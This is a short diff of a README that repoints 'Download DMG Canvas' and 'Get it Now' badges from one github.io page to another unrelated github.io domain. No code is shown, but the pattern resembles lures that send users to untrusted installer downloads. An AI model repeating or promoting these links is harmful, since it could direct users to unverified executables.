@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://gazan-programs.github.io/.github/dMGCanvas">
+  <a href="https://polycia-apps.github.io/.github/dMGCanvas">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download DMG Canvas"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ The command-line interface for CI/CD integration is increasingly essential for p
 
 <p align="center">
 
-[![Get it Now DMG Canvas](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://gazan-programs.github.io/.github/dMGCanvas)
+[![Get it Now DMG Canvas](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/dMGCanvas)
 
 </p>
 
